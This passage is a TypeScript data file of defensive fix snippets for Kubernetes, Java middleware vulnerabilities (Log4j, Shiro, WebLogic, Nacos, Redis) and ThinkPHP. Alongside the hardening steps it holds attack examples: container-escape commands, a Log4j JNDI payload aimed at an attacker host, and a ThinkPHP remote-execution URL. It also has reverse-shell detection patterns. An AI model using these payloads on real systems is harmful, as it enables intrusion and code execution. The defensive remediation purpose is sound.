# 用标签创建deny-all NetworkPolicy`,
    oneliner: `kubectl get svc -A | grep -E 'NodePort|LoadBalancer' && kubectl get netpol -A`,
    tags: ['k8s', 'network', 'networkpolicy', '网络', '隔离', 'service'],
  },
  {
    id: 'k8s-emergency', lang: 'K8s/容器', vuln: 'K8s应急响应', title: 'K8s应急响应Checklist(比赛必做)',
    desc: 'K8s集群应急响应前5分钟必做',
    fix: `# === 1. 快速概览 ===
kubectl get pods -A -o wide
kubectl get svc -A | grep -E 'NodePort|LoadBalancer'
kubectl get nodes

# === 2. 安全扫描 ===
# 特权Pod
kubectl get pods -A -o json | jq -r '.items[]|select(.spec.containers[].securityContext.privileged==true)|"[PRIV] \\(.metadata.namespace)/\\(.metadata.name)"'
# 反弹Shell
kubectl get pods -A -o json | jq -r '.items[]|.metadata as $m|.spec.containers[]|select((.command//[])+(.args//[])|join(" ")|test("/dev/tcp|bash -i"))|"[SHELL] \\($m.namespace)/\\($m.name)"'
# cluster-admin SA
kubectl get clusterrolebindings -o json | jq -r '.items[]|select(.roleRef.name=="cluster-admin")|.subjects[]?|select(.name|startswith("system:")|not)|"[ADMIN] \\(.kind)/\\(.name)"'

# === 3. 删除恶意资源 ===
kubectl delete pod MALICIOUS_POD -n NS --force --grace-period=0
kubectl patch cronjob MALICIOUS_CJ -n NS -p '{"spec":{"suspend":true}}'
kubectl delete cronjob MALICIOUS_CJ -n NS
kubectl delete sa MALICIOUS_SA -n NS

# === 4. 隔离受影响namespace ===
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: emergency-deny-all
  namespace: TARGET_NS
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
EOF

# === 5. 检查节点持久化 ===
ls /etc/kubernetes/manifests/
systemctl list-unit-files --state=enabled | grep -vE 'snap|systemd|docker|ssh|cron'
crontab -l 2>/dev/null`,
    oneliner: `kubectl get pods -A -o json | jq -r '.items[]|select(.spec.containers[].securityContext.privileged==true or (.spec.containers[]|(.command//[])+(.args//[])|join(" ")|test("/dev/tcp|bash -i")))|"\\(.metadata.namespace)/\\(.metadata.name)"'`,
    tags: ['k8s', '应急', 'emergency', 'checklist', '比赛', '响应'],
  },
  {
    id: 'k8s-secret-audit', lang: 'K8s/容器', vuln: 'K8s敏感信息', title: 'K8s Secret/ConfigMap敏感信息排查',
    desc: '排查Secret明文、ConfigMap泄露、环境变量密码',
    fix: `# === 列出所有Secret(非默认token) ===
kubectl get secrets -A | grep -v 'kubernetes.io/service-account-token' | grep -v 'helm.sh'

# === 查看Secret内容(base64解码) ===
kubectl get secret SECRET_NAME -n NS -o json | jq -r '.data | to_entries[] | "\\(.key): \\(.value | @base64d)"'

# === 搜索ConfigMap中的敏感信息 ===
kubectl get configmaps -A -o json | jq -r '
  .items[] | select(.data != null) |
  .metadata as $m |
  .data | to_entries[] |
  select(.value | test("password|secret|token|key|credential"; "i")) |
  "\\($m.namespace)/\\($m.name) key=\\(.key)"'

# === Pod环境变量中的密码 ===
kubectl get pods -A -o json | jq -r '
  .items[] | select(.metadata.namespace != "kube-system") |
  .metadata as $m |
  .spec.containers[].env[]? |
  select(.name | test("PASS|SECRET|TOKEN|KEY|CRED"; "i")) |
  "\\($m.namespace)/\\($m.name) \\(.name)=\\(.value // "ref:"+.valueFrom.secretKeyRef.name)"'`,
    oneliner: `kubectl get secrets -A | grep -v service-account-token | grep -v helm.sh | grep -c '' && echo "secrets found"`,
    tags: ['k8s', 'secret', 'configmap', '敏感信息', '密码', '泄露'],
  },
  {
    id: 'k8s-container-escape', lang: 'K8s/容器', vuln: 'K8s容器逃逸', title: 'K8s容器逃逸利用与防护',
    desc: '常见容器逃逸路径和防护方法',
    bad: `# === 常见逃逸路径 ===
# 1. privileged + nsenter
nsenter -t 1 -m -u -i -n -p -- bash

# 2. docker.sock挂载
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# 3. hostPID + /proc/1/root
ls /proc/1/root/

# 4. SYS_ADMIN cap + mount
mount -t cgroup cgroup /tmp/cgrp && echo 1 > /tmp/cgrp/notify_on_release`,
    fix: `# === Pod安全配置(防逃逸) ===
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: app:v1
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        memory: "256Mi"
        cpu: "500m"`,
    oneliner: `kubectl get pods -A -o json | jq -r '.items[]|select(.spec.hostPID==true or .spec.hostIPC==true or .spec.containers[].securityContext.privileged==true)|"\\(.metadata.namespace)/\\(.metadata.name)"'`,
    tags: ['k8s', 'container', 'escape', '逃逸', 'nsenter', 'privileged', 'capabilities'],
  },
];

// ═══════════════════════════════════════
// 中间件 / 组件 1day (线下防御赛高频)
// ═══════════════════════════════════════
const middleware: SecFixSnippet[] = [
  {
    id: 'mw-log4j', lang: '中间件', vuln: 'Log4j JNDI RCE',
    title: 'Log4j2 JNDI注入 (CVE-2021-44228/44832)',
    cve: 'CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-44832',
    affected: 'Log4j2 2.0-beta9 ~ 2.17.0 (不含)',
    desc: '${jndi:ldap://} 查找导致 RCE, 强烈推荐升级到 2.17.1+',
    bad: `logger.info("User-Agent: " + request.getHeader("User-Agent"));\n// UA: \${jndi:ldap://attacker/x} 即可 RCE`,
    fix: `# ===== 方案1: 升级 (推荐) =====
# 替换 log4j-core.jar 为 2.17.1+
# Gradle: implementation 'org.apache.logging.log4j:log4j-core:2.17.1'

# ===== 方案2: JVM 参数关闭 (紧急) =====
# 在启动脚本 JAVA_OPTS 添加:
-Dlog4j2.formatMsgNoLookups=true

# ===== 方案3: 删除 JndiLookup 类 (暴力有效) =====
zip -q -d \${CATALINA_HOME}/webapps/**/WEB-INF/lib/log4j-core-*.jar \\
  org/apache/logging/log4j/core/lookup/JndiLookup.class

# ===== 方案4: 设置环境变量 =====
export LOG4J_FORMAT_MSG_NO_LOOKUPS=true`,
    oneliner: `find / -name 'log4j-core-*.jar' 2>/dev/null | while read j; do zip -q -d "$j" org/apache/logging/log4j/core/lookup/JndiLookup.class 2>/dev/null && echo "patched: $j"; done`,
    verify: `find / -name 'log4j-core-*.jar' 2>/dev/null | xargs -I{} unzip -l {} | grep -i JndiLookup  # 应无输出`,
    tags: ['log4j', 'log4shell', 'jndi', 'rce', 'java', '中间件', 'cve-2021-44228'],
  },
  {
    id: 'mw-fastjson1', lang: '中间件', vuln: 'Fastjson AutoType',
    title: 'Fastjson 1.x AutoType RCE',
    cve: 'CVE-2017-18349, CVE-2022-25845, 及多个绕过',
    affected: 'Fastjson < 1.2.83',
    desc: 'AutoType 触发恶意类加载, 影响全部 1.x 分支',
    fix: `# ===== 方案1: 升级到 1.2.83 (最后一个 1.x 安全版) =====
# Maven: <version>1.2.83</version>

# ===== 方案2: 强制关闭 AutoType (代码层) =====
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
// 并且不要使用 ParserConfig.getGlobalInstance().addAccept(...)

# ===== 方案3: 升级到 Fastjson2 (推荐, 默认更安全) =====
# Maven: com.alibaba.fastjson2:fastjson2:2.0.43+
# 包名从 com.alibaba.fastjson.* 改为 com.alibaba.fastjson2.*
import com.alibaba.fastjson2.JSON;

# ===== 方案4: 系统属性禁用 =====
-Dfastjson.parser.safeMode=true`,
    oneliner: `find / -name 'fastjson*.jar' 2>/dev/null | xargs -I{} unzip -p {} META-INF/MANIFEST.MF 2>/dev/null | grep -i 'Implementation-Version'`,
    verify: `find / -name 'fastjson-*.jar' 2>/dev/null | xargs -I{} basename {} | sort -u  # 确认版本 >= 1.2.83 或已切到 fastjson2`,
    tags: ['fastjson', 'autotype', 'rce', 'java', '中间件', '反序列化'],
  },
  {
    id: 'mw-shiro-550', lang: '中间件', vuln: 'Shiro默认Key',
    title: 'Shiro RememberMe 反序列化 (Shiro-550/721)',
    cve: 'CVE-2016-4437 (Shiro-550), CVE-2019-12422 (Shiro-721)',
    affected: 'Shiro < 1.2.5 使用默认 key; 或 1.4.2 以下 Padding Oracle',
    desc: 'rememberMe cookie 使用硬编码 AES key kPH+bIxk5D2deZiIxcaaaA== 导致反序列化 RCE',
    fix: `# ===== 方案1: 修改 CipherKey 随机化 =====
# shiro.ini 或 SecurityManager 初始化时:
# [main]
# cookieCipherKey = <openssl rand -base64 16 生成的随机值>
# rememberMeManager.cipherKey = $cookieCipherKey

# 或 Java 代码:
byte[] key = new SecureRandom().generateSeed(16);
CookieRememberMeManager rmm = new CookieRememberMeManager();
rmm.setCipherKey(key);

# ===== 方案2: 升级到 Shiro 1.11+ 并采用 GCM =====
# pom.xml: <version>1.13.0</version>

# ===== 方案3: 直接禁用 RememberMe (暴力) =====
<dependency>
  <groupId>org.apache.shiro</groupId>
  <artifactId>shiro-core</artifactId>
</dependency>
# 代码中: securityManager.setRememberMeManager(null);`,
    oneliner: `grep -rn 'kPH+bIxk5D2deZiIxcaaaA==\\|rememberMe.*cipherKey\\|CookieRememberMe' --include='*.java' --include='*.xml' --include='*.ini' --include='*.properties' / 2>/dev/null | head -20`,
    verify: `find / -name 'shiro-core-*.jar' 2>/dev/null  # 检查版本; curl 'http://target/' -H "Cookie: rememberMe=bad" -v | grep -i rememberMe  # 确认 deleteMe 不触发异常`,
    tags: ['shiro', 'rememberme', 'rce', 'java', '中间件', '反序列化', 'cve-2016-4437'],
  },
  {
    id: 'mw-weblogic-t3', lang: '中间件', vuln: 'WebLogic T3',
    title: 'WebLogic T3/IIOP 反序列化',
    cve: 'CVE-2023-21839, CVE-2023-21931, CVE-2020-2883, CVE-2020-14882',
    affected: 'WebLogic 10.3 ~ 14.1.1',
    desc: 'T3 协议反序列化 + 控制台未授权访问, 长期 1day',
    fix: `# ===== 方案1: 关闭 T3 协议 (最快) =====
# 控制台: 环境 -> 服务器 -> 协议 -> 一般信息 -> 勾选"启用通道"为 HTTP only
# 或通过 WLST:
connect('weblogic','password','t3://localhost:7001')
cd('Servers/AdminServer/NetworkAccessPoints/AdminServer')
cmo.setOutboundEnabled(false)

# ===== 方案2: 使用连接过滤器限制 T3 源 IP =====
# 控制台: 安全 -> 连接筛选器 -> weblogic.security.net.ConnectionFilterImpl
# 规则: 127.0.0.1 * * allow t3 t3s
#       0.0.0.0/0 * * deny t3 t3s

# ===== 方案3: 关闭 IIOP =====
# 控制台: 协议 -> IIOP -> 取消勾选"启用 IIOP"

# ===== 方案4: 关闭 /console (生产建议) =====
# config.xml:
# <domain>
#   <console-enabled>false</console-enabled>
# </domain>

# ===== 方案5: 打官方补丁 =====
# 应用 2023年 1月 / 4月 / 7月 CPU 补丁`,
    oneliner: `ss -tlnp | grep -E ':7001|:7002'  # 检查 T3/T3S 端口; # 封禁外网 T3: iptables -I INPUT -p tcp --dport 7001 ! -s 127.0.0.1 -j DROP`,
    verify: `# 验证 T3 是否已关: java -cp wlthint3client.jar ... 应连接失败; curl -I http://target:7001/console/  # 应 404/403`,
    tags: ['weblogic', 't3', 'iiop', 'rce', 'java', '中间件', '反序列化'],
  },
  {
    id: 'mw-spring4shell', lang: '中间件', vuln: 'Spring Core RCE',
    title: 'Spring4Shell (CVE-2022-22965)',
    cve: 'CVE-2022-22965',
    affected: 'Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19; JDK 9+; 且使用 war 部署到 Tomcat',
    desc: 'Class.module.classLoader.* 属性绑定污染 AccessLogValve 写文件 getshell',
    fix: `# ===== 方案1: 升级 (推荐) =====
# Spring Framework 升级到 5.3.18+ 或 5.2.20+
# Spring Boot 升级到 2.6.6+ 或 2.5.12+

# ===== 方案2: 全局 @ControllerAdvice 屏蔽危险字段 =====
@ControllerAdvice
@Order(10000)
public class BinderControllerAdvice {
    @InitBinder
    public void setAllowedFields(WebDataBinder dataBinder) {
        String[] denylist = new String[]{
            "class.*", "Class.*", "*.class.*", "*.Class.*"
        };
        dataBinder.setDisallowedFields(denylist);
    }
}

# ===== 方案3: 临时 Filter 拦截 class. 参数 =====
@WebFilter(urlPatterns = "/*")
public class Spring4ShellFilter implements Filter {
  public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) {
    if (((HttpServletRequest)req).getParameterMap().keySet().stream()
        .anyMatch(k -> k.toLowerCase().contains("class."))) {
      ((HttpServletResponse)resp).sendError(400); return;
    }
    chain.doFilter(req, resp);
  }
}`,
    oneliner: `grep -rn 'spring-webmvc\\|spring-core' --include='pom.xml' --include='build.gradle' / 2>/dev/null | head -10`,
    verify: `# 验证: curl 'http://target/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=test' 应 400 或被过滤`,
    tags: ['spring', 'spring4shell', 'rce', 'java', '中间件', 'cve-2022-22965'],
  },
  {
    id: 'mw-tomcat-ajp', lang: '中间件', vuln: 'Tomcat AJP',
    title: 'Tomcat AJP Ghostcat (CVE-2020-1938)',
    cve: 'CVE-2020-1938',
    affected: 'Tomcat 6/7/8/9 默认开启 8009 AJP',
    desc: 'AJP 协议可读任意文件 + 配合上传 getshell',
    fix: `# ===== 方案1: 直接关闭 AJP Connector (推荐) =====
# 编辑 \${CATALINA_HOME}/conf/server.xml, 注释或删除:
# <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />

# ===== 方案2: 配置 secret 和 requiredSecret =====
<Connector port="8009" protocol="AJP/1.3"
           address="127.0.0.1"
           redirectPort="8443"
           secret="YOUR_RANDOM_SECRET_HERE"
           secretRequired="true" />

# ===== 方案3: 升级到 9.0.31+ / 8.5.51+ / 7.0.100+ =====
# 升级后 secretRequired 默认为 true

# 重启 Tomcat:
\${CATALINA_HOME}/bin/shutdown.sh && \${CATALINA_HOME}/bin/startup.sh`,
    oneliner: `ss -tlnp | grep :8009  # 检查是否监听; sed -i 's|<Connector port="8009"|<!--<Connector port="8009"|;s|protocol="AJP/1.3".*/>|protocol="AJP/1.3" />-->|' \${CATALINA_HOME}/conf/server.xml`,
    verify: `ss -tlnp | grep :8009  # 应无输出; curl http://target:8009 应拒绝连接`,
    tags: ['tomcat', 'ajp', 'ghostcat', 'rce', 'lfi', 'java', '中间件', 'cve-2020-1938'],
  },
  {
    id: 'mw-struts2', lang: '中间件', vuln: 'Struts2 OGNL',
    title: 'Struts2 OGNL 系列 RCE',
    cve: 'S2-001 ~ S2-066, CVE-2023-50164 等',
    affected: 'Struts2 几乎全版本存在历史漏洞',
    desc: 'OGNL 表达式注入导致 RCE, 最新的 S2-066 针对文件上传',
    fix: `# ===== 方案1: 升级到 2.5.33+ / 6.3.0.2+ =====
# pom.xml: <version>6.3.0.2</version>

# ===== 方案2: struts.xml 关闭动态方法调用 =====
<constant name="struts.enable.DynamicMethodInvocation" value="false" />
<constant name="struts.devMode" value="false" />
<constant name="struts.ognl.allowStaticMethodAccess" value="false" />

# ===== 方案3: 限制 OGNL 类访问 =====
# struts.xml 添加:
<constant name="struts.excludedClasses" value="java.lang.Object,java.lang.Runtime,java.lang.Process,java.lang.System,java.lang.Thread,java.lang.ThreadGroup,java.lang.ClassLoader,java.lang.ProcessBuilder,java.io.File,java.io.ObjectInputStream,java.io.ObjectOutputStream,javax.script.ScriptEngine"/>

# ===== 方案4: 删除样例 showcase (必做) =====
rm -rf \${CATALINA_HOME}/webapps/struts2-showcase/
rm -rf \${CATALINA_HOME}/webapps/struts2-blank/`,
    oneliner: `find / -name 'struts2-core-*.jar' 2>/dev/null; rm -rf \${CATALINA_HOME}/webapps/struts2-showcase 2>/dev/null`,
    verify: `grep -E 'devMode|DynamicMethodInvocation' \${CATALINA_HOME}/webapps/*/WEB-INF/classes/struts.xml 2>/dev/null`,
    tags: ['struts2', 'ognl', 'rce', 'java', '中间件'],
  },
  {
    id: 'mw-druid', lang: '中间件', vuln: 'Druid StatView未授权',
    title: 'Druid 监控页未授权访问',
    affected: 'Alibaba Druid StatView Servlet 所有版本默认无认证',
    desc: '/druid/index.html 泄露 SQL、会话、URL, 可窃取 sessionId 横向',
    fix: `# ===== 方案1: 关闭 StatViewServlet =====
# application.yml:
spring:
  datasource:
    druid:
      stat-view-servlet:
        enabled: false

# ===== 方案2: 配置账号密码 =====
spring:
  datasource:
    druid:
      stat-view-servlet:
        enabled: true
        login-username: admin
        login-password: RANDOM_STRONG_PASSWORD_HERE
        allow: 127.0.0.1
        deny: 0.0.0.0/0
        url-pattern: /druid/*
        reset-enable: false

# ===== 方案3: XML 配置方式 =====
<servlet>
  <servlet-name>DruidStatView</servlet-name>
  <servlet-class>com.alibaba.druid.support.http.StatViewServlet</servlet-class>
  <init-param>
    <param-name>loginUsername</param-name><param-value>admin</param-value>
  </init-param>
  <init-param>
    <param-name>loginPassword</param-name><param-value>STRONG_PASS</param-value>
  </init-param>
  <init-param>
    <param-name>allow</param-name><param-value>127.0.0.1</param-value>
  </init-param>
</servlet>

# ===== 方案4: Nginx 层拦截 =====
location /druid/ { deny all; return 403; }`,
    oneliner: `curl -sI http://localhost:8080/druid/index.html | head -1; grep -rn 'druid.*stat-view\\|StatViewServlet' --include='*.yml' --include='*.properties' --include='*.xml' / 2>/dev/null | head -5`,
    verify: `curl -sI http://localhost:8080/druid/index.html  # 应 401/403/404`,
    tags: ['druid', '未授权', 'monitor', 'java', '中间件'],
  },
  {
    id: 'mw-nacos', lang: '中间件', vuln: 'Nacos身份绕过',
    title: 'Nacos 鉴权绕过 (CVE-2021-29441)',
    cve: 'CVE-2021-29441',
    affected: 'Nacos <= 1.4.0, 以及使用默认 token.secret.key',
    desc: 'User-Agent: Nacos-Server 即可绕过鉴权; 默认 token key 导致 JWT 伪造',
    fix: `# ===== 方案1: 升级到 2.2.3+ =====

# ===== 方案2: 修改 application.properties =====
# nacos-server/conf/application.properties
nacos.core.auth.enabled=true
nacos.core.auth.enable.userAgentAuthWhite=false

# 修改默认 token key (32 字符以上 Base64)
nacos.core.auth.default.token.secret.key=$(openssl rand -base64 32)

# 修改默认 server identity (不使用默认 serverIdentity=security)
nacos.core.auth.server.identity.key=CHANGE_ME
nacos.core.auth.server.identity.value=$(openssl rand -hex 16)

# ===== 方案3: 修改 nacos 默认账号密码 =====
# 登录 http://nacos:8848/nacos (默认 nacos/nacos) 立即改密码
# 或数据库 users 表 UPDATE 密码

# ===== 方案4: 限制 8848 端口访问 =====
iptables -I INPUT -p tcp --dport 8848 ! -s 127.0.0.1 -j DROP`,
    oneliner: `curl -s 'http://localhost:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server' | head -c 500`,
    verify: `curl -s 'http://localhost:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server' | grep -q 'unknown user' && echo OK || echo STILL_VULNERABLE`,
    tags: ['nacos', '未授权', 'bypass', 'java', '中间件', 'cve-2021-29441'],
  },
  {
    id: 'mw-redis-unauth', lang: '中间件', vuln: 'Redis未授权',
    title: 'Redis 未授权 + 主从/RDB RCE',
    affected: 'Redis 默认监听 0.0.0.0 且无密码',
    desc: '绑定 0.0.0.0 + 无密码 -> 写 crontab/authorized_keys/webshell, 主从复制 RCE',
    fix: `# ===== redis.conf 必改项 =====
# 1. 只监听本地 (推荐)
bind 127.0.0.1 ::1

# 2. 开启保护模式
protected-mode yes

# 3. 设置强密码 (openssl rand -base64 24)
requirepass YOUR_LONG_RANDOM_PASSWORD

# 4. 禁用/重命名危险命令 (主从复制 RCE 必做)
rename-command FLUSHALL ""
rename-command CONFIG ""
rename-command EVAL ""
rename-command DEBUG ""
rename-command SHUTDOWN ""
rename-command SLAVEOF ""
rename-command REPLICAOF ""

# 5. 指定 RDB 目录 (避免被写到 /root/.ssh 等)
dir /var/lib/redis/
dbfilename dump.rdb

# 6. 不以 root 启动
# /etc/systemd/system/redis.service:
# User=redis
# Group=redis

# 重启
systemctl restart redis`,
    oneliner: `redis-cli -h 127.0.0.1 ping 2>/dev/null; echo; ss -tlnp | grep :6379; grep -E '^bind|^requirepass|^protected-mode|^rename-command' /etc/redis/redis.conf /etc/redis.conf 2>/dev/null`,
    verify: `redis-cli -h 127.0.0.1 ping  # 无密码应 NOAUTH; 有密码 redis-cli -a PASS ping 应 PONG`,
    tags: ['redis', '未授权', 'rce', 'rdb', '主从', '中间件'],
  },
  {
    id: 'mw-solr', lang: '中间件', vuln: 'Solr RCE',
    title: 'Solr Velocity 模板 RCE (CVE-2019-17558)',
    cve: 'CVE-2019-17558, CVE-2017-12629, CVE-2023-50386',
    affected: 'Solr 5.0.0 ~ 8.3.1',
    desc: 'params.resource.loader.enabled 打开后 Velocity 模板注入 RCE',
    fix: `# ===== 方案1: 升级到 8.4.0+ =====

# ===== 方案2: 禁用 VelocityResponseWriter =====
# 编辑 solrconfig.xml, 移除或注释:
# <queryResponseWriter name="velocity" class="solr.VelocityResponseWriter">
#   <str name="params.resource.loader.enabled">true</str>  <-- 关键
# </queryResponseWriter>

# 或直接删除 velocity 模块:
rm -rf \${SOLR_HOME}/contrib/velocity/
rm -f \${SOLR_HOME}/server/solr-webapp/webapp/WEB-INF/lib/solr-velocity-*.jar

# ===== 方案3: 开启鉴权 (security.json) =====
{
  "authentication": {
    "blockUnknown": true,
    "class": "solr.BasicAuthPlugin",
    "credentials": {"solr": "BASE64_SHA256_PW_SALT"}
  }
}
# 上传: curl -X PUT ... /zk/configs/security.json

# ===== 方案4: 限制端口 =====
iptables -I INPUT -p tcp --dport 8983 ! -s 127.0.0.1 -j DROP`,
    oneliner: `curl -s 'http://localhost:8983/solr/admin/cores?action=STATUS&wt=json' | head -c 500`,
    verify: `curl -s -o /dev/null -w '%{http_code}\\n' 'http://localhost:8983/solr/admin/cores'  # 应 401 或 404`,
    tags: ['solr', 'velocity', 'rce', '未授权', 'java', '中间件', 'cve-2019-17558'],
  },
  {
    id: 'mw-xxljob', lang: '中间件', vuln: 'XXL-JOB未授权',
    title: 'XXL-JOB Executor 未授权 RCE',
    cve: 'CVE-2022-36157 类似',
    affected: 'XXL-JOB Executor < 2.3.0 默认无 accessToken',
    desc: 'Executor 9999 端口默认无鉴权, glue.java 类型任务可执行任意 Java/Shell',
    fix: `# ===== 方案1: 升级到 2.4.0+ =====

# ===== 方案2: 配置 accessToken (application.properties) =====
# 在 admin 和所有 executor 端都要配同一个 token
xxl.job.accessToken=$(openssl rand -base64 32)

# ===== 方案3: Executor 绑定 127.0.0.1 + 防火墙 =====
xxl.job.executor.ip=127.0.0.1
xxl.job.executor.port=9999

# 仅 admin 所在 IP 可访问 9999:
iptables -I INPUT -p tcp --dport 9999 ! -s ADMIN_IP -j DROP

# ===== 方案4: 关闭 GLUE 在线编辑 (admin UI) =====
# xxl-job-admin 数据库: xxl_job_group.register_type 审慎配置
# 禁用 BeanShell/GLUE 执行器模式, 仅允许 BEAN 模式`,
    oneliner: `ss -tlnp | grep -E ':9999|:8080.*xxl'; find / -name 'xxl-job-*.jar' 2>/dev/null`,
    verify: `curl -s http://localhost:9999/ 2>/dev/null | head -c 200  # 配置后应 401`,
    tags: ['xxl-job', '未授权', 'rce', 'java', '中间件'],
  },
  {
    id: 'mw-jackson', lang: '中间件', vuln: 'Jackson反序列化',
    title: 'Jackson Default Typing 反序列化',
    affected: 'Jackson 2.x 开启 enableDefaultTyping',
    desc: 'enableDefaultTyping() 打开后配合多种 gadget 链 RCE',
    fix: `// ===== 方案1: 不使用 enableDefaultTyping =====
ObjectMapper mapper = new ObjectMapper();
// ❌ 不要写: mapper.enableDefaultTyping();

// ===== 方案2: 必须开启时, 用白名单 PolymorphicTypeValidator =====
BasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("com.your.company.")  // 只允许你自己的包
    .build();
mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);

// ===== 方案3: 升级 Jackson 到 2.15+ 并显式声明 =====
// 或改用 @JsonTypeInfo(use = Id.NAME) + @JsonSubTypes 显式类型注册

// ===== 方案4: 禁用危险类 =====
mapper.getDeserializationConfig().withoutFeatures(
    MapperFeature.USE_ANNOTATIONS
);`,
    oneliner: `grep -rn 'enableDefaultTyping\\|activateDefaultTyping' --include='*.java' . 2>/dev/null | head -20`,
    verify: `grep -rn 'enableDefaultTyping' --include='*.java' . 2>/dev/null  # 应无结果或已加 Validator`,
    tags: ['jackson', '反序列化', 'rce', 'java', '中间件'],
  },
  {
    id: 'mw-apache-httpd', lang: '中间件', vuln: 'Apache HTTPD路径穿越',
    title: 'Apache HTTPD 路径穿越 (CVE-2021-41773/42013)',
    cve: 'CVE-2021-41773, CVE-2021-42013',
    affected: 'Apache HTTPD 2.4.49, 2.4.50',
    desc: 'mod_alias 路径规范化缺陷, 可读 /etc/passwd, 若启用 mod_cgi 可 RCE',
    fix: `# ===== 方案1: 升级到 2.4.51+ (推荐) =====
yum update httpd
# 或
apt upgrade apache2

# ===== 方案2: 修改 httpd.conf 加强 Directory 限制 =====
<Directory />
    Require all denied
    AllowOverride None
    Options None
</Directory>

<Directory "/var/www/html">
    Require all granted
    AllowOverride None
    Options -Indexes -ExecCGI
</Directory>

# ===== 方案3: 如不需要 CGI, 禁用 mod_cgi =====
a2dismod cgi cgid
systemctl restart apache2`,
    oneliner: `httpd -v 2>/dev/null || apache2 -v 2>/dev/null; httpd -M 2>/dev/null | grep -i cgi`,
    verify: `curl --path-as-is 'http://localhost/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd' 2>/dev/null | head  # 应 403/404`,
    tags: ['apache', 'httpd', '路径穿越', 'lfi', 'rce', '中间件', 'cve-2021-41773'],
  },
  {
    id: 'mw-nginx-hardening', lang: '中间件', vuln: 'Nginx加固',
    title: 'Nginx 通用安全加固',
    desc: '隐藏版本号, 禁用危险方法, 基础 CSP, 防目录遍历',
    fix: `# /etc/nginx/nginx.conf 或 server 块内:

# 1. 隐藏版本号
server_tokens off;
more_clear_headers 'Server';  # 需 nginx-module-headers-more

# 2. 禁用危险 HTTP 方法
if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE)$) {
    return 405;
}

# 3. 限制 User-Agent (拦截扫描器)
if ($http_user_agent ~* (nmap|nikto|sqlmap|fimap|nessus|whatweb|Openvas|jbrofuzz|libwhisker|webshag|acunetix)) {
    return 403;
}

# 4. 禁止访问隐藏文件和备份
location ~ /\\.(git|svn|hg|env|ht|DS_Store) { deny all; return 404; }
location ~ \\.(bak|swp|old|sql|tar|gz|zip|log|conf)$ { deny all; return 404; }

# 5. 防止 Host 头污染
server {
    listen 80 default_server;
    server_name _;
    return 444;  # 不识别的 Host 直接断
}

# 6. 安全响应头
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "no-referrer-when-downgrade" always;
add_header Content-Security-Policy "default-src 'self'" always;

# 7. 限流
limit_req_zone $binary_remote_addr zone=req:10m rate=30r/s;
limit_conn_zone $binary_remote_addr zone=conn:10m;
limit_req zone=req burst=100 nodelay;
limit_conn conn 20;

# 8. 禁用 autoindex
autoindex off;

# 9. 客户端限制
client_max_body_size 10m;
client_body_buffer_size 128k;

nginx -t && systemctl reload nginx`,
    oneliner: `nginx -t && sed -i 's/^#\\s*server_tokens.*/server_tokens off;/' /etc/nginx/nginx.conf; grep -E '^server_tokens|^add_header' /etc/nginx/nginx.conf`,
    verify: `curl -sI http://localhost/ | grep -iE '^server|x-frame|x-content|csp'  # 应无详细版本, 有安全头`,
    tags: ['nginx', '加固', '中间件', 'hardening'],
  },
];

// ═══════════════════════════════════════
// CMS / 应用框架常见 getshell 修复
// ═══════════════════════════════════════
const cms: SecFixSnippet[] = [
  {
    id: 'cms-thinkphp5', lang: 'CMS', vuln: 'ThinkPHP 5 RCE',
    title: 'ThinkPHP 5.x 多路由 RCE',
    cve: 'CNVD-2018-24942, 及多个 call_user_func_array 链',
    affected: 'ThinkPHP 5.0.x < 5.0.24, 5.1.x < 5.1.31, 5.2.x < 5.2',
    desc: '?s=/index/think\\app/invokefunction&function=... 等路由可执行任意函数',
    bad: `// URL: /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`,
    fix: `# ===== 方案1: 升级版本 (推荐) =====
composer update topthink/framework  # 至少 5.0.24 / 5.1.41 / 最新 5.2

# ===== 方案2: 关闭路由完整匹配 (application/config.php) =====
# 找到 'route_complete_match' 改为 true (5.1)
'route_complete_match' => true,

# ===== 方案3: 关闭 Debug 模式 (必做) =====
# application/config.php:
'app_debug' => false,
'app_trace' => false,
# 或 .env:
APP_DEBUG = false

# ===== 方案4: 删除测试入口 =====
rm -f /var/www/html/public/router.php
rm -f /var/www/html/public/index_dev.php

# ===== 方案5: 路径参数过滤 (Nginx 兜底) =====
location /index.php {
    if ($query_string ~* "s=.*think\\\\app|invokefunction|call_user_func|captcha/_CAPTCHA") {
        return 403;
    }
    fastcgi_pass unix:/var/run/php-fpm.sock;
    ...
}`,
    oneliner: `find / -name 'think' -path '*/thinkphp/*' 2>/dev/null | head; grep -rn 'app_debug\\|APP_DEBUG' /var/www 2>/dev/null | grep -i 'true' | head -5`,
    verify: `curl -s 'http://localhost/?s=/index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1' | head -c 500  # 应 404/403 不含 phpinfo`,
    tags: ['thinkphp', 'tp5', 'rce', 'php', 'cms'],
  },
  {
    id: 'cms-thinkphp6', lang: 'CMS', vuln: 'ThinkPHP 6 漏洞',
    title: 'ThinkPHP 6.0 Session 文件包含/反序列化',
    cve: 'ThinkPHP 6.0.1 session RCE, 多个反序列化链',
